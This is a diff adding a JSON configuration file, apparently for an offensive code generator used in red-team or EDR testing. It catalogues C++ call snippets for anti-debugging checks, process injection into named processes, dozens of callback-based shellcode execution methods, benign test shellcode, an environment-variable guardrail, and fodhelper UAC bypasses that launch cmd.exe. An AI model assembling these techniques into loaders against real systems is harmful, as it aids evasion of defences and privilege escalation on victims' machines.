@@ -1,0 +1,322 @@
+{
+  "sections": [
+    {
+      "header": "ANTI-DEBUGGING",
+      "template": "ANTIDEBUGGING",
+      "display": "Anti-Debugging",
+      "allowMultiple": true,
+      "items": [
+        {
+          "id": "AdfCloseHandleOnInvalidAddress",
+          "display": "AdfCloseHandleOnInvalidAddress",
+          "snippet": "if(AdfCloseHandleOnInvalidAddress()) return 0;"
+        },
+        {
+          "id": "AdfIsCreateProcessDebugEventCodeSet",
+          "display": "AdfIsCreateProcessDebugEventCodeSet",
+          "snippet": "if(AdfIsCreateProcessDebugEventCodeSet()) return 0;"
+        },
+        {
+          "id": "AdfOpenProcessOnCsrss",
+          "display": "AdfOpenProcessOnCsrss",
+          "snippet": "if(AdfOpenProcessOnCsrss()) return 0;"
+        },
+        {
+          "id": "IsIntelHardwareBreakpointPresent",
+          "display": "IsIntelHardwareBreakpointPresent",
+          "snippet": "if(IsIntelHardwareBreakpointPresent()) return 0;"
+        },
+        {
+          "id": "CheckRemoteDebuggerPresent2",
+          "display": "CheckRemoteDebuggerPresent2",
+          "snippet": "if(CheckRemoteDebuggerPresent2()) return 0;"
+        },
+        {
+          "id": "IsDebuggerPresentEx",
+          "display": "IsDebuggerPresentEx",
+          "snippet": "if(IsDebuggerPresentEx()) return 0;"
+        }
+      ]
+    },
+    {
+      "header": "PROCESS INJECTION",
+      "template": "PSINJECTION",
+      "display": "Process Injection",
+      "allowMultiple": false,
+      "items": [
+        {
+          "id": "MpfPiWriteProcessMemoryCreateRemoteThread",
+          "display": "MpfPiWriteProcessMemoryCreateRemoteThread",
+          "snippet": "if (MpfPiWriteProcessMemoryCreateRemoteThread((PBYTE)code_blob,dwSize, GetProcessOrThreadId(L\"$psname$\", false))) return 1;"
+        },
+        {
+          "id": "MpfPiQueueUserAPCViaAtomBomb",
+          "display": "MpfPiQueueUserAPCViaAtomBomb",
+          "snippet": "if (MpfPiQueueUserAPCViaAtomBomb((PBYTE)code_blob,dwSize, GetProcessOrThreadId(L\"$psname$\", false))) return 1;"
+        },
+        {
+          "id": "MpfPiControlInjection",
+          "display": "MpfPiControlInjection",
+          "snippet": "if (MpfPiControlInjection((PBYTE)code_blob,dwSize, GetProcessOrThreadId(L\"$psname$\", true))) return 1;"
+        },
+        {
+          "id": "MpfProcessInjectionViaProcessReflection",
+          "display": "MpfProcessInjectionViaProcessReflection",
+          "snippet": "if (MpfProcessInjectionViaProcessReflection((PBYTE)code_blob,dwSize, GetProcessOrThreadId(L\"$psname$\", true))) return 1;"
+        }
+      ]
+    },
+    {
+      "header": "SHELLCODE EXECUTION",
+      "template": "SHELLCODEEXECUTION",
+      "display": "Shellcode Execution",
+      "allowMultiple": false,
+      "items": [
+        {
+          "id": "MpfSceViaEnumChildWindows",
+          "display": "MpfSceViaEnumChildWindows",
+          "snippet": "if (MpfSceViaEnumChildWindows((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaCDefFolderMenu_Create2",
+          "display": "MpfSceViaCDefFolderMenu_Create2",
+          "snippet": "if (MpfSceViaCDefFolderMenu_Create2((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaCertEnumSystemStore",
+          "display": "MpfSceViaCertEnumSystemStore",
+          "snippet": "if (MpfSceViaCertEnumSystemStore((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaCertEnumSystemStoreLocation",
+          "display": "MpfSceViaCertEnumSystemStoreLocation",
+          "snippet": "if (MpfSceViaCertEnumSystemStoreLocation((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumDateFormatsW",
+          "display": "MpfSceViaEnumDateFormatsW",
+          "snippet": "if (MpfSceViaEnumDateFormatsW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumDesktopWindows",
+          "display": "MpfSceViaEnumDesktopWindows",
+          "snippet": "if (MpfSceViaEnumDesktopWindows((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumDesktopsW",
+          "display": "MpfSceViaEnumDesktopsW",
+          "snippet": "if (MpfSceViaEnumDesktopsW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumDirTreeW",
+          "display": "MpfSceViaEnumDirTreeW",
+          "snippet": "if (MpfSceViaEnumDirTreeW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumDisplayMonitors",
+          "display": "MpfSceViaEnumDisplayMonitors",
+          "snippet": "if (MpfSceViaEnumDisplayMonitors((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumFontFamiliesExW",
+          "display": "MpfSceViaEnumFontFamiliesExW",
+          "snippet": "if (MpfSceViaEnumFontFamiliesExW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumFontsW",
+          "display": "MpfSceViaEnumFontsW",
+          "snippet": "if (MpfSceViaEnumFontsW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumLanguageGroupLocalesW",
+          "display": "MpfSceViaEnumLanguageGroupLocalesW",
+          "snippet": "if (MpfSceViaEnumLanguageGroupLocalesW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumObjects",
+          "display": "MpfSceViaEnumObjects",
+          "snippet": "if (MpfSceViaEnumObjects((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumResourceTypesExW",
+          "display": "MpfSceViaEnumResourceTypesExW",
+          "snippet": "if (MpfSceViaEnumResourceTypesExW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumSystemCodePagesW",
+          "display": "MpfSceViaEnumSystemCodePagesW",
+          "snippet": "if (MpfSceViaEnumSystemCodePagesW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumSystemGeoID",
+          "display": "MpfSceViaEnumSystemGeoID",
+          "snippet": "if (MpfSceViaEnumSystemGeoID((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumSystemLanguageGroupsW",
+          "display": "MpfSceViaEnumSystemLanguageGroupsW",
+          "snippet": "if (MpfSceViaEnumSystemLanguageGroupsW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumSystemLocalesEx",
+          "display": "MpfSceViaEnumSystemLocalesEx",
+          "snippet": "if (MpfSceViaEnumSystemLocalesEx((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumThreadWindows",
+          "display": "MpfSceViaEnumThreadWindows",
+          "snippet": "if (MpfSceViaEnumThreadWindows((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumTimeFormatsEx",
+          "display": "MpfSceViaEnumTimeFormatsEx",
+          "snippet": "if (MpfSceViaEnumTimeFormatsEx((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumUILanguagesW",
+          "display": "MpfSceViaEnumUILanguagesW",
+          "snippet": "if (MpfSceViaEnumUILanguagesW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumWindowStationsW",
+          "display": "MpfSceViaEnumWindowStationsW",
+          "snippet": "if (MpfSceViaEnumWindowStationsW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumWindows",
+          "display": "MpfSceViaEnumWindows",
+          "snippet": "if (MpfSceViaEnumWindows((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumerateLoadedModules64",
+          "display": "MpfSceViaEnumerateLoadedModules64",
+          "snippet": "if (MpfSceViaEnumerateLoadedModules64((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaK32EnumPageFilesW",
+          "display": "MpfSceViaK32EnumPageFilesW",
+          "snippet": "if (MpfSceViaK32EnumPageFilesW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumPwrSchemes",
+          "display": "MpfSceViaEnumPwrSchemes",
+          "snippet": "if (MpfSceViaEnumPwrSchemes((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaImmEnumInputContext",
+          "display": "MpfSceViaImmEnumInputContext",
+          "snippet": "if (MpfSceViaImmEnumInputContext((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaEnumPropsExW",
+          "display": "MpfSceViaEnumPropsExW",
+          "snippet": "if (MpfSceViaEnumPropsExW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaCryptEnumOIDInfo",
+          "display": "MpfSceViaCryptEnumOIDInfo",
+          "snippet": "if (MpfSceViaCryptEnumOIDInfo((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaDSA_EnumCallback",
+          "display": "MpfSceViaDSA_EnumCallback",
+          "snippet": "if (MpfSceViaDSA_EnumCallback((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaFlsAlloc",
+          "display": "MpfSceViaFlsAlloc",
+          "snippet": "if (MpfSceViaFlsAlloc((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaInitOnceExecuteOnce",
+          "display": "MpfSceViaInitOnceExecuteOnce",
+          "snippet": "if (MpfSceViaInitOnceExecuteOnce((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaChooseColorW",
+          "display": "MpfSceViaChooseColorW",
+          "snippet": "if (MpfSceViaChooseColorW((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaClusWorkerCreate",
+          "display": "MpfSceViaClusWorkerCreate",
+          "snippet": "if (MpfSceViaClusWorkerCreate((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaSymEnumProcesses",
+          "display": "MpfSceViaSymEnumProcesses",
+          "snippet": "if (MpfSceViaSymEnumProcesses((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaImageGetDigestStream",
+          "display": "MpfSceViaImageGetDigestStream",
+          "snippet": "if (MpfSceViaImageGetDigestStream((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaVerifierEnumerateResource",
+          "display": "MpfSceViaVerifierEnumerateResource",
+          "snippet": "if (MpfSceViaVerifierEnumerateResource((PBYTE)code_blob,dwSize)) return 1;"
+        },
+        {
+          "id": "MpfSceViaSymEnumSourceFiles",
+          "display": "MpfSceViaSymEnumSourceFiles",
+          "snippet": "if (MpfSceViaSymEnumSourceFiles((PBYTE)code_blob,dwSize)) return 1;"
+        }
+      ]
+    },
+    {
+      "header": "GENERIC SHELLCODE PAYLOADS FOR TESTINGS",
+      "template": "GENERICSHELLCODE",
+      "display": "Generic Shellcode Payloads",
+      "allowMultiple": false,
+      "items": [
+        {
+          "id": "GenericShellcodeHelloWorldMessageBoxA",
+          "display": "GenericShellcodeHelloWorldMessageBoxA",
+          "snippet": "PCHAR code_blob = GenericShellcodeHelloWorldMessageBoxA(&dwSize);"
+        },
+        {
+          "id": "GenericShellcodeHelloWorldMessageBoxAEbFbLoop",
+          "display": "GenericShellcodeHelloWorldMessageBoxAEbFbLoop",
+          "snippet": "PCHAR code_blob = GenericShellcodeHelloWorldMessageBoxAEbFbLoop(&dwSize);"
+        },
+        {
+          "id": "GenericShellcodeOpenCalcExitThread",
+          "display": "GenericShellcodeOpenCalcExitThread",
+          "snippet": "PCHAR code_blob = GenericShellcodeOpenCalcExitThread(&dwSize);"
+        }
+      ]
+    },
+    {
+      "header": "GUARDRAILS",
+      "template": "GUARDRAIL",
+      "display": "Guardrails (env vars)",
+      "allowMultiple": false,
+      "items": [
+        {
+          "id": "RequireEnvironmentVariable",
+          "display": "Require Environment Variable",
+          "snippet": "if (GetEnvironmentVariableW(L\"__GUARDRAIL_PARAM__\", nullptr, 0) == 0)\n{\n    return 0;\n}"
+        }
+      ]
+    },
+    {
+      "header": "UAC BYPASSES",
+      "template": "UACB",
+      "display": "UAC Bypasses",
+      "allowMultiple": false,
+      "items": [
+        {
+          "id": "UacBypassFodHelperMethodW",
+          "display": "UacBypassFodHelperMethodW",
+          "snippet": "PROCESS_INFORMATION pi{};\nif (UacBypassFodHelperMethodW(L\"C:\\Windows\\System32\\cmd.exe\", &pi))\n{\n    CloseHandle(pi.hThread);\n    CloseHandle(pi.hProcess);\n    return 1;\n}"
+        },
+        {
+          "id": "UacBypassFodHelperMethodA",
+          "display": "UacBypassFodHelperMethodA",
+          "snippet": "PROCESS_INFORMATION pi{};\nif (UacBypassFodHelperMethodA(\"C:\\Windows\\System32\\cmd.exe\", &pi))\n{\n    CloseHandle(pi.hThread);\n    CloseHandle(pi.hProcess);\n    return 1;\n}"
+        }
+      ]
+    }
+  ]
+}
